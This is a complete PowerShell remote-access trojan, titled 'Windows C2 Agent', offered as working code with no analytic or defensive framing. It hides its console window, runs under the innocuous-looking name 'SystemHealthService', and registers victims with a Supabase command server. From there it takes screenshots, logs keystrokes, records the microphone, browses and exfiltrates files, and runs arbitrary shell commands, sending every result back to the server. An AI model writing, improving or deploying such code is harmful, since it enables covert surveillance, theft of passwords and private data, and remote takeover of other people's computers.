# ================================
# WINDOWS C2 AGENT - FIXED VERSION
# ================================

# Suppress errors and progress bars
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Hide console window
try {
    Add-Type -Name Window -Namespace Native -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,Int32 n);'
    [Native.Window]::ShowWindow([Native.Window]::GetConsoleWindow(), 0)
} catch {}

# ================================
# CONFIGURATION
# ================================

$basePath = "C:\ProgramData\SystemHealthService"

# Wait for internet connection
while (!(Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)) {
    Start-Sleep 5
}
Start-Sleep 5

# Load config
$config = Get-Content "$basePath\config.json" -Raw | ConvertFrom-Json
$deviceIdFile = "$basePath\device_id.txt"

# Get or create device ID
if (Test-Path $deviceIdFile) {
    $deviceId = (Get-Content $deviceIdFile -Raw).Trim()
} else {
    $deviceId = [guid]::NewGuid().ToString()
    $deviceId | Out-File $deviceIdFile -NoNewline
    (Get-Item $deviceIdFile).Attributes = "Hidden"
}

# Generate random device name (8 chars)
$deviceName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })

# ================================
# API HELPER FUNCTION
# ================================

$headers = @{
    "apikey" = $config.supabase_key
    "Authorization" = "Bearer $($config.supabase_key)"
    "Content-Type" = "application/json"
    "Prefer" = "return=minimal"
}

function Invoke-API {
    param(
        $endpoint,
        $method = "GET",
        $body = $null
    )
    
    $uri = "$($config.supabase_url)/rest/v1/$endpoint"
    
    try {
        if ($body) {
            Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -Body ($body | ConvertTo-Json -Depth 10 -Compress) -TimeoutSec 30
        } else {
            Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -TimeoutSec 30
        }
    } catch {
        $null
    }
}

# ================================
# REGISTER DEVICE
# ================================

$registrationData = @{
    device_id = $deviceId
    device_name = $deviceName
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os_info = (Get-CimInstance Win32_OperatingSystem).Caption
}

Invoke-API -endpoint "devices" -method "POST" -body $registrationData

# ================================
# TASK FUNCTIONS
# ================================

# Screenshot Capture
function Capture-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $memoryStream = New-Object System.IO.MemoryStream
        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        $base64 = [Convert]::ToBase64String($memoryStream.ToArray())
        
        $graphics.Dispose()
        $bitmap.Dispose()
        $memoryStream.Dispose()
        
        return @{
            data_type = "display"
            file_data = $base64
        }
    } catch {
        return @{
            data_type = "display"
            data = "Failed: $_"
        }
    }
}

# Keylogger Function - FIXED VERSION
function Capture-Keystrokes {
    param($duration = 60)
    
    try {
        # Load required assemblies
        Add-Type -AssemblyName System.Windows.Forms
        
        # Import GetAsyncKeyState API
        Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name KeyState -Namespace User -EA SilentlyContinue
        
        # Use StringBuilder for better performance instead of file I/O
        $keystrokeBuffer = New-Object System.Text.StringBuilder
        
        # Calculate end time with explicit comparison
        $startTime = Get-Date
        $endTime = $startTime.AddSeconds($duration)
        
        # Track processed keys to avoid duplicates
        $processedKeys = @{}
        
        # Monitor keystrokes until duration expires
        while ((Get-Date) -lt $endTime) {
            try {
                # Check virtual key codes 8-190
                for ($virtualKey = 8; $virtualKey -le 190; $virtualKey++) {
                    # Check if key is pressed (-32767 means just pressed)
                    $keyState = [User.KeyState]::GetAsyncKeyState($virtualKey)
                    
                    if ($keyState -eq -32767) {
                        $keyName = [System.Windows.Forms.Keys]$virtualKey
                        [void]$keystrokeBuffer.Append("$keyName ")
                    }
                }
                
                # Sleep 50ms between checks to reduce CPU usage
                Start-Sleep -Milliseconds 50
                
            } catch {
                # If inner loop fails, break to avoid infinite loop
                break
            }
        }
        
        # Get captured keystrokes
        $keystrokeData = $keystrokeBuffer.ToString()
        
        # Return data
        if ($keystrokeData -and $keystrokeData.Trim()) {
            return @{
                data_type = "input"
                data = $keystrokeData
            }
        } else {
            return @{
                data_type = "input"
                data = "[No keystrokes recorded]"
            }
        }
    } catch {
        return @{
            data_type = "input"
            data = "Error: $_"
        }
    }
}

# System Info
function Get-SystemInfo {
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $computer = Get-CimInstance Win32_ComputerSystem
        
        $info = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            os = $os.Caption
            os_version = $os.Version
            manufacturer = $computer.Manufacturer
            model = $computer.Model
            memory_gb = [math]::Round($computer.TotalPhysicalMemory / 1GB, 2)
        }
        
        return @{
            data_type = "sysinfo"
            data = ($info | ConvertTo-Json -Compress)
        }
    } catch {
        return @{
            data_type = "sysinfo"
            data = "Error: $_"
        }
    }
}

# Audio Recording
function Record-Audio {
    param($duration = 10)
    
    try {
        $audioFile = "$basePath\rec.wav"
        
        # Define MCI commands
        Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class AudioRecorder{[DllImport("winmm.dll",EntryPoint="mciSendStringA")]public static extern int mciSendString(string command,string buffer,int bufferSize,IntPtr hwndCallback);}' -Language CSharp -EA SilentlyContinue
        
        # Start recording
        [AudioRecorder]::mciSendString("open new Type waveaudio Alias recorder", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("set recorder bitspersample 16", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("set recorder samplespersec 22050", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("set recorder channels 1", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("record recorder", "", 0, [IntPtr]::Zero)
        
        # Wait for duration
        Start-Sleep $duration
        
        # Stop and save
        [AudioRecorder]::mciSendString("stop recorder", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("save recorder `"$audioFile`"", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("close recorder", "", 0, [IntPtr]::Zero)
        
        # Read and encode audio file
        if (Test-Path $audioFile) {
            $audioBytes = [System.IO.File]::ReadAllBytes($audioFile)
            $base64 = [Convert]::ToBase64String($audioBytes)
            Remove-Item $audioFile -Force -EA SilentlyContinue
            
            return @{
                data_type = "audio"
                file_data = $base64
            }
        } else {
            return @{
                data_type = "audio"
                data = "Failed to create audio file"
            }
        }
    } catch {
        return @{
            data_type = "audio"
            data = "Error: $_"
        }
    }
}

# File Browser - Lists drives or folder contents
function Browse-Files {
    param($path = "")
    
    try {
        $items = @()
        
        if ($path -eq "" -or $path -eq "drives") {
            # List all drives
            $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null }
            foreach ($drive in $drives) {
                $items += @{
                    name = "$($drive.Name):\"
                    type = "drive"
                    size = $drive.Used + $drive.Free
                    free = $drive.Free
                }
            }
        } else {
            # Normalize path - but don't remove trailing slash from drive roots
            if ($path -match '^[A-Za-z]:\\?$') {
                # It's a drive root, ensure it has backslash
                $path = $path.TrimEnd('\') + '\'
            } else {
                $path = $path.TrimEnd('\\')
            }
            
            if (!(Test-Path $path)) {
                return @{
                    data_type = "file_list"
                    data = (@{ error = "Path not found: $path"; path = $path } | ConvertTo-Json -Compress)
                }
            }
            
            # List folder contents
            $children = Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue
            foreach ($child in $children) {
                $item = @{
                    name = $child.Name
                    type = if ($child.PSIsContainer) { "folder" } else { "file" }
                    size = if ($child.PSIsContainer) { 0 } else { $child.Length }
                    modified = $child.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                }
                $items += $item
            }
        }
        
        return @{
            data_type = "file_list"
            data = (@{ path = $path; items = $items; count = $items.Count } | ConvertTo-Json -Depth 5 -Compress)
        }
    } catch {
        return @{
            data_type = "file_list"
            data = (@{ error = "Error: $_"; path = $path } | ConvertTo-Json -Compress)
        }
    }
}

# File Download - Reads file and returns as base64 chunks
function Download-File {
    param($filePath, $chunkSize = 512000) # 500KB default
    
    try {
        if (!(Test-Path $filePath)) {
            return @{
                data_type = "file_download"
                data = (@{ error = "File not found: $filePath" } | ConvertTo-Json -Compress)
            }
        }
        
        $fileInfo = Get-Item $filePath
        $fileSize = $fileInfo.Length
        
        # Check 1GB limit
        if ($fileSize -gt 1073741824) {
            return @{
                data_type = "file_download"
                data = (@{ error = "File too large (max 1GB)"; size = $fileSize } | ConvertTo-Json -Compress)
            }
        }
        
        # Read entire file and encode
        $bytes = [System.IO.File]::ReadAllBytes($filePath)
        $base64 = [Convert]::ToBase64String($bytes)
        
        return @{
            data_type = "file_download"
            data = (@{ 
                filename = $fileInfo.Name
                size = $fileSize
                path = $filePath
            } | ConvertTo-Json -Compress)
            file_data = $base64
        }
    } catch {
        return @{
            data_type = "file_download"
            data = (@{ error = "Error: $_" } | ConvertTo-Json -Compress)
        }
    }
}

# Command Execution
function Execute-Command {
    param($cmd)
    
    try {
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = "cmd.exe"
        $processInfo.Arguments = "/c $cmd"
        $processInfo.RedirectStandardOutput = $true
        $processInfo.RedirectStandardError = $true
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        $process.Start() | Out-Null
        
        $output = $process.StandardOutput.ReadToEnd()
        $errorOutput = $process.StandardError.ReadToEnd()
        $process.WaitForExit(30000)
        
        $result = @{
            command = $cmd
            output = $output
            error = $errorOutput
            exit_code = $process.ExitCode
        }
        
        return @{
            data_type = "cmd_result"
            data = ($result | ConvertTo-Json -Compress)
        }
    } catch {
        $result = @{
            command = $cmd
            error = "$_"
        }
        
        return @{
            data_type = "cmd_result"
            data = ($result | ConvertTo-Json -Compress)
        }
    }
}

# Self-Destruct Function
function Self-Destruct {
    try {
        # Delete scheduled tasks
        schtasks /delete /tn "SystemHealthMonitor" /f 2>$null
        schtasks /delete /tn "SystemHealthAdmin" /f 2>$null
        
        # Kill other agent processes
        Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {
            $_.Id -ne $PID -and $_.MainWindowTitle -eq ""
        } | Stop-Process -Force -ErrorAction SilentlyContinue
        
        # Wait a moment for processes to terminate
        Start-Sleep -Seconds 2
        
        # Remove agent folder
        $agentPath = "C:\ProgramData\SystemHealthService"
        if (Test-Path $agentPath) {
            Remove-Item $agentPath -Recurse -Force -ErrorAction SilentlyContinue
        }
        
        return @{
            data_type = "destruct"
            data = "Windows agent destroyed successfully"
        }
    } catch {
        return @{
            data_type = "destruct"
            data = "Destruction failed: $_"
        }
    }
}

# ================================
# TASK EXECUTION WITH TIMEOUT
# ================================

function Execute-TaskWithTimeout {
    param(
        $task,
        $timeoutSeconds = 300
    )
    
    $scriptBlock = {
        param($taskType, $taskParams)
        
        $result = $null
        
        switch ($taskType) {
            "display_capture" {
                $result = Capture-Screenshot
            }
            
            "input_monitor" {
                $duration = 60
                if ($taskParams -and $taskParams.duration) {
                    $duration = [int]$taskParams.duration
                }
                $result = Capture-Keystrokes -duration $duration
            }
            
            "system_info" {
                $result = Get-SystemInfo
            }
            
            "voice_record" {
                $duration = 10
                if ($taskParams -and $taskParams.duration) {
                    $duration = [int]$taskParams.duration
                }
                $result = Record-Audio -duration $duration
            }
            
            "cmd_exec" {
                $command = ""
                if ($taskParams -and $taskParams.command) {
                    $command = $taskParams.command
                }
                
                if ($command) {
                    $result = Execute-Command -cmd $command
                } else {
                    $result = @{
                        data_type = "cmd_result"
                        data = "No command provided"
                    }
                }
            }
        }
        
        return $result
    }
    
    try {
        # Start job with timeout
        $job = Start-Job -ScriptBlock $scriptBlock -ArgumentList $task.task_type, $task.task_params
        
        # Wait for job with timeout
        $completed = Wait-Job $job -Timeout $timeoutSeconds
        
        if ($completed) {
            # Job completed successfully
            $result = Receive-Job $job
            Remove-Job $job -Force
            return $result
        } else {
            # Job timed out
            Stop-Job $job
            Remove-Job $job -Force
            
            return @{
                data_type = "error"
                data = "Task timed out after $timeoutSeconds seconds"
            }
        }
    } catch {
        return @{
            data_type = "error"
            data = "Task execution error: $_"
        }
    }
}

# ================================
# MAIN LOOP
# ================================

# Set sync intervals (default 10 seconds)
$syncInterval = if ($config.sync_interval) { $config.sync_interval } else { 10 }
$retryInterval = if ($config.retry_interval) { $config.retry_interval } else { 10 }

while ($true) {
    try {
        # Update last sync time
        Invoke-API -endpoint "devices?device_id=eq.$deviceId" -method "PATCH" -body @{ last_sync = (Get-Date -Format "o") } | Out-Null
        
        # Get pending tasks
        $tasks = Invoke-API -endpoint "tasks?device_id=eq.$deviceId&status=eq.pending&task_type=not.in.(cmd_exec_admin,ps_exec_admin,auto_destruct)&select=id,task_type,task_params"
        
        if ($tasks) {
            # Ensure tasks is an array
            if ($tasks -isnot [array]) {
                $tasks = @($tasks)
            }
            
            # Process each task
            foreach ($task in $tasks) {
                # Mark task as processing
                Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{ status = "processing" } | Out-Null
                
                # Execute task based on type (inline for better performance)
                $taskResult = $null
                
                switch ($task.task_type) {
                    "display_capture" {
                        $taskResult = Capture-Screenshot
                    }
                    
                    "input_monitor" {
                        $duration = 60
                        if ($task.task_params -and $task.task_params.duration) {
                            $duration = [int]$task.task_params.duration
                        }
                        # Cap duration at 5 minutes to prevent indefinite processing
                        if ($duration -gt 300) { $duration = 300 }
                        $taskResult = Capture-Keystrokes -duration $duration
                    }
                    
                    "system_info" {
                        $taskResult = Get-SystemInfo
                    }
                    
                    "voice_record" {
                        $duration = 10
                        if ($task.task_params -and $task.task_params.duration) {
                            $duration = [int]$task.task_params.duration
                        }
                        # Cap duration at 2 minutes
                        if ($duration -gt 120) { $duration = 120 }
                        $taskResult = Record-Audio -duration $duration
                    }
                    
                    "cmd_exec" {
                        $command = ""
                        if ($task.task_params -and $task.task_params.command) {
                            $command = $task.task_params.command
                        }
                        
                        if ($command) {
                            $taskResult = Execute-Command -cmd $command
                        } else {
                            $taskResult = @{
                                data_type = "cmd_result"
                                data = "No command provided"
                            }
                        }
                    }
                    
                    "file_browse" {
                        $path = ""
                        if ($task.task_params -and $task.task_params.path) {
                            $path = $task.task_params.path
                        }
                        $taskResult = Browse-Files -path $path
                    }
                    
                    "file_download" {
                        $filePath = ""
                        if ($task.task_params -and $task.task_params.file) {
                            $filePath = $task.task_params.file
                        }
                        if ($filePath) {
                            $taskResult = Download-File -filePath $filePath
                        } else {
                            $taskResult = @{
                                data_type = "file_download"
                                data = (@{ error = "No file path provided" } | ConvertTo-Json -Compress)
                            }
                        }
                    }
                    
                    "auto_destruct" {
                        # Send telemetry that we received the command
                        $telemetryData = @{
                            device_id = $deviceId
                            data_type = "destruct"
                            data = "User agent received destruct - handing off to SYSTEM agent"
                        }
                        Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
                        
                        # DO NOT mark task as complete - let the Admin agent pick it up
                        # DO NOT try cleanup - user agent lacks privileges
                        # Just exit gracefully
                        exit 0
                    }
                    
                    "restart_agent" {
                        # Mark task complete before restart
                        Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
                            status = "complete"
                            completed_at = (Get-Date -Format "o")
                        } | Out-Null
                        
                        # Send telemetry
                        $telemetryData = @{
                            device_id = $deviceId
                            data_type = "sysinfo"
                            data = "Agent restarting..."
                        }
                        Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
                        
                        # Restart both scheduled tasks
                        try {
                            Stop-ScheduledTask -TaskName "SystemHealthMonitor" -ErrorAction SilentlyContinue
                            Start-ScheduledTask -TaskName "SystemHealthMonitor" -ErrorAction SilentlyContinue
                            Stop-ScheduledTask -TaskName "SystemHealthAdmin" -ErrorAction SilentlyContinue
                            Start-ScheduledTask -TaskName "SystemHealthAdmin" -ErrorAction SilentlyContinue
                        } catch {}
                        
                        # Exit current instance to allow restart
                        exit 0
                    }
                    
                    default {
                        $taskResult = @{
                            data_type = "error"
                            data = "Unknown task type: $($task.task_type)"
                        }
                    }
                }
                
                # Save results to telemetry
                if ($taskResult) {
                    $telemetryData = @{
                        device_id = $deviceId
                        data_type = $taskResult.data_type
                    }
                    
                    if ($taskResult.file_data) {
                        $telemetryData.file_data = $taskResult.file_data
                    }
                    
                    if ($taskResult.data) {
                        $telemetryData.data = $taskResult.data
                    }
                    
                    # Insert into telemetry table
                    Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
                }
                
                # Mark task as complete
                Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
                    status = "complete"
                    completed_at = (Get-Date -Format "o")
                } | Out-Null
            }
        }
        
        Start-Sleep $syncInterval
        
    } catch {
        Start-Sleep $retryInterval
    }
}
